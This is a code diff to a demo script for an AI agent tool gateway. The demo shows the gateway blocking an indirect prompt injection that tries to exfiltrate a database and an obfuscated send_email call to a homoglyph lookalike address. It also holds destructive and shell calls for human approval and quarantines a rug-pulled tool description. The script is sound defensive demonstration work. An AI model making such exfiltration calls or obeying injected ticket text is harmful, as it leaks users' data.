@@ -1,13 +1,16 @@
 #!/usr/bin/env python3
-"""Five-minute demo for the Secure Agent Tool Gateway.
+"""Six-step demo for the Secure Agent Tool Gateway.
 
 Runs the same agent twice-over against the gateway and narrates each step:
 
   1. benign task works normally (and shows the added latency)
   2. an indirect prompt injection in a ticket tries to exfiltrate the DB -> blocked
   3. the same attack, obfuscated (base64 + homoglyph) -> still blocked
-  4. a destructive tool call -> held for human approval
-  5. a rug-pulled tool description -> quarantined
+  4. a destructive tool call -> held for a human, who DENIES it
+  5. a privileged but legitimate command -> held for a human, who APPROVES it, and it runs
+  6. a rug-pulled tool description -> quarantined
+
+Run with --human to approve / deny steps 4 and 5 yourself in the dashboard.
 
 Then it points at the dashboard and the benchmark table.
 
@@ -60,6 +63,35 @@ def admin(method: str, path: str, body: dict | None = None) -> dict:
                                  data=json.dumps(body).encode() if body else None)
     with urllib.request.urlopen(req, timeout=5) as r:
         return json.loads(r.read() or "{}")
+
+
+HUMAN = "--human" in sys.argv  # let a person click Approve / Deny in the dashboard
+
+
+async def reviewer(tool: str, outcome: str) -> None:
+    """Act as the human reviewer for the next held call to `tool`.
+
+    By default the script decides after a short pause, so the demo runs on its
+    own. With --human it prints instructions and waits for a real person to
+    click Approve or Deny in the dashboard (Approvals page or agent console)."""
+    for _ in range(40):  # wait up to ~10 s for the call to reach the queue
+        await asyncio.sleep(0.25)
+        pending = [p for p in admin("GET", "/admin/approvals") if p["tool"] == tool]
+        if pending:
+            break
+    else:
+        return
+    item = pending[0]
+    if HUMAN:
+        print(f"  {Y}→ {tool} is waiting for you: open the dashboard → Approvals and click "
+              f"{'APPROVE' if outcome == 'approve' else 'DENY'} (60 s; no answer = deny){RST}")
+        while any(p["id"] == item["id"] for p in admin("GET", "/admin/approvals")):
+            await asyncio.sleep(1)
+        return
+    print(f"  {Y}→ held for approval (id {item['id']}); reviewer clicks "
+          f"{'APPROVE' if outcome == 'approve' else 'DENY'}{RST}")
+    await asyncio.sleep(1.5)
+    admin("POST", f"/admin/approvals/{item['id']}", {"outcome": outcome})
 
 
 def banner(n: int, title: str) -> None:
@@ -115,22 +147,22 @@ async def main() -> None:
         r = await call(client, "send_email", {"to": "audit@\u0430cme.example", "subject": "x", "body": "data"})
         show(r)
 
-        banner(4, "Destructive action needs a human")
-        print(f"{DIM}Agent calls delete_all_emails. The gateway holds it; we approve or deny in the dashboard.{RST}")
-
-        async def approve_soon():
-            await asyncio.sleep(1.5)
-            pend = admin("GET", "/admin/approvals")
-            if pend:
-                print(f"  {Y}→ approval required (id {pend[0]['id']}); denying it as the reviewer{RST}")
-                admin("POST", f"/admin/approvals/{pend[0]['id']}", {"outcome": "deny"})
-
-        task = asyncio.create_task(approve_soon())
+        banner(4, "Destructive action: the human reviewer says NO")
+        print(f"{DIM}The agent calls delete_all_emails. The gateway holds it until a person decides.{RST}")
+        task = asyncio.create_task(reviewer("delete_all_emails", "deny"))
         r = await call(client, "delete_all_emails", {})
         await task
-        show(r)
+        assert show(r) == "deny", "the denied deletion must not run"
 
-        banner(5, "A tool changes its description behind our back (rug pull)")
+        banner(5, "Privileged but legitimate: the human reviewer says YES")
+        print(f"{DIM}The agent asks to run a shell command (ls). Shell access always needs a human; once approved it really runs.{RST}")
+        task = asyncio.create_task(reviewer("run_shell", "approve"))
+        r = await call(client, "run_shell", {"command": "ls"})
+        await task
+        assert show(r) == "allow", "the approved command should run"
+        print(f"  {DIM}output: {' '.join((r.content[0].text if r.content else '').split())[:100]}{RST}")
+
+        banner(6, "A tool changes its description behind our back (rug pull)")
         print(f"{DIM}The comms server silently rewrites send_email's description. The gateway quarantines it.{RST}")
         try:
             httpx.post(f"{COMMS}/admin/rugpull", headers={"X-Gateway-Credential": os.environ.get('TOOL_SHARED_SECRET', 'dev-tool-secret-change-me')}, timeout=3)
